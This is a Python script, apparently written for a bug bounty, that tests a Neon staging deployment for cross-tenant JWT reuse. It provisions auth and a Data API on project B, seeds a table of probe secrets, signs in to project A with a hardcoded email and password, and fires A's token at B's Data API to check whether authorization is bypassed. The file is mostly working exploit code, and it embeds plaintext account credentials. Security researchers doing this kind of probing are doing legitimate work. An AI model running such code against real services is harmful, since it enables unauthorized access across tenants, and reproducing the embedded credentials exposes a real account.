# -*- coding: utf-8 -*-
"""跨租户 JWT 复用实测(B 项目): B enable auth -> 建 Data API -> 建表授权
-> 用 A(orange-sun) 的 JWT 打 B 的 Data API -> 若验签通过 = 跨项目洞"""
import http.client, ssl, json, time, os, sys, re

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
API_HOST = 'console-stage.neon.build'
API_BASE = '/api/v2'

keyj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_apikey.json')))
KEY = keyj.get('key') or list(keyj.values())[0]
ctxb = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx_b.json')))
PID2, BID2 = ctxb['pid2'], ctxb['bid2']

# A 项目信息
ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
ORG = ctxj['org']

def req(host, method, path, body=None, headers=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    conn.close()
    return st, raw

def api(method, path, body=None, use_cookie=False):
    if use_cookie:
        from _neon_creds_stage import cookie_str
        return req(API_HOST, method, API_BASE + path, body, {'Cookie': cookie_str(), 'X-Bug-Bounty': 'xxbo'})
    return req(API_HOST, method, API_BASE + path, body, {'Authorization': 'Bearer ' + str(KEY), 'X-Bug-Bounty': 'xxbo'})

# 1. B 连接串
st, raw = api('GET', '/projects/%s/connection_uri?branch_id=%s&database_name=neondb&role_name=neondb_owner' % (PID2, BID2))
print('[1] connection_uri -> %d' % st)
uri = ''
try:
    uri = json.loads(raw).get('connection_uri', '')
except Exception:
    print(' ', raw.decode(errors='replace')[:200])
print('  uri=%s' % uri[:120])

# 2. enable auth on B
print('\n[2] enable auth on B')
st, raw = api('POST', '/projects/%s/branches/%s/auth' % (PID2, BID2),
              {'auth_provider': 'better_auth'})
print('  -> %d %s' % (st, raw.decode(errors='replace')[:300]))
b_auth = {}
try:
    b_auth = json.loads(raw)
except Exception:
    pass

# 3. 建 Data API (neon_auth provider, 默认 grants)
print('\n[3] create data-api on B')
st, raw = api('POST', '/projects/%s/branches/%s/data-api/neondb' % (PID2, BID2),
              {'auth_provider': 'neon_auth', 'add_default_grants': True})
print('  -> %d %s' % (st, raw.decode(errors='replace')[:300]))
da_url = ''
try:
    da_url = json.loads(raw).get('url', '')
except Exception:
    pass

# 4. 等待 data-api active
print('\n[4] 等待 data-api active')
for i in range(24):
    st, raw = api('GET', '/projects/%s/branches/%s/data-api/neondb' % (PID2, BID2))
    try:
        dj = json.loads(raw)
        status = dj.get('status', '')
        if status == 'active':
            da_url = dj.get('url', da_url)
            print('  active! url=%s' % da_url)
            print('  settings=%s' % json.dumps(dj.get('settings'))[:300])
            print('  schemas=%s' % dj.get('available_schemas'))
            break
    except Exception:
        pass
    print('  wait %d (%s)' % (i, raw.decode(errors='replace')[:80]))
    time.sleep(5)

# 5. B PG 建表
print('\n[5] B PG 建表')
import psycopg
m = re.match(r'postgresql://([^:]+):([^@]+)@([^/]+)/(\w+)', uri)
b_host, b_pwd = m.group(3), m.group(2)
try:
    dbc = psycopg.connect('postgresql://neondb_owner:%s@%s/neondb' % (b_pwd, b_host), connect_timeout=20)
    dbc.autocommit = True
    cur = dbc.cursor()
    def q(sql):
        try:
            cur.execute(sql)
            try:
                return str(cur.fetchall())[:200]
            except Exception:
                return 'OK'
        except Exception as e:
            return 'ERR: %s' % str(e)[:150]
    print('  roles: %s' % q("SELECT rolname FROM pg_roles WHERE rolname IN ('authenticated','anonymous','authenticator','neondb_owner')"))
    print('  drop: %s' % q('DROP TABLE IF EXISTS public.k_xprobe'))
    print('  create: %s' % q('CREATE TABLE public.k_xprobe (id serial PRIMARY KEY, secret text)'))
    print('  insert: %s' % q("INSERT INTO public.k_xprobe (secret) VALUES ('B-secret-1'), ('B-secret-2')"))
    print('  grant: %s' % q("GRANT SELECT, INSERT, UPDATE, DELETE ON public.k_xprobe TO authenticated"))
    print('  grant seq: %s' % q("GRANT USAGE ON SEQUENCE public.k_xprobe_id_seq TO authenticated"))
    dbc.close()
except Exception as e:
    print('  PG ERR: %s' % e)

# 6. A 的 JWT
def auth_login(na_host, email, pwd):
    conn = http.client.HTTPSConnection(na_host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json', 'Origin': 'http://localhost:3000'}
    conn.request('POST', '/neondb/auth/sign-in/email', body=json.dumps({'email': email, 'password': pwd}).encode(), headers=h)
    r = conn.getresponse(); r.read()
    cks = r.headers.get_all('Set-Cookie')
    conn.close()
    cook = '; '.join(c.split(';')[0] for c in cks)
    st, raw = req(na_host, 'GET', '/neondb/auth/token', headers={'Cookie': cook})
    return json.loads(raw).get('token', '')

jwt_a = auth_login('ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build',
                  'libobo1229+na2@gmail.com', 'SecTest!2026pass2')
print('  A jwt len=%d' % len(jwt_a))

# 7. A 的 JWT 打 B 的 Data API
if da_url:
    m2 = re.match(r'https://([^/]+)(/.*)$', da_url)
    b_da_host, b_da_base = m2.group(1), m2.group(2).rstrip('/')
    print('\n[7] A JWT -> B Data API')
    for tag, j in (('A-JWT(跨项目)', jwt_a), ('无JWT', '')):
        st, raw = req(b_da_host, 'GET', b_da_base + '/k_xprobe?limit=5',
                      headers={'Authorization': 'Bearer ' + j} if j else None)
        print('  [%s] -> %d %s' % (tag, st, raw.decode(errors='replace')[:250]))
        time.sleep(0.5)
    # 8. B 的 JWKS kid vs A 的 kid
    print('\n[8] JWKS kid 对比')
    st, raw = req(b_da_host.replace('.apirest.', '.neonauth.'), 'GET', '/.well-known/jwks.json') if False else (0, b'')
    # B 的 auth 域 host 从 b_auth.base_url 或 jwks_url 解析
    b_auth_url = b_auth.get('base_url') or b_auth.get('jwks_url', '')
    print('  B auth base_url=%s' % b_auth_url)
    if b_auth_url:
        m3 = re.match(r'https://([^/]+)', b_auth_url)
        b_na_host = m3.group(1)
        st, raw = req(b_na_host, 'GET', '/neondb/auth/.well-known/jwks.json')
        print('  B jwks -> %d %s' % (st, raw.decode(errors='replace')[:200]))
    # 保存状态
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx_b.json'), 'w') as f:
        json.dump({'pid2': PID2, 'bid2': BID2, 'uri': uri, 'da_url': da_url, 'auth': b_auth}, f, indent=1)
    print('\n记录更新完毕')
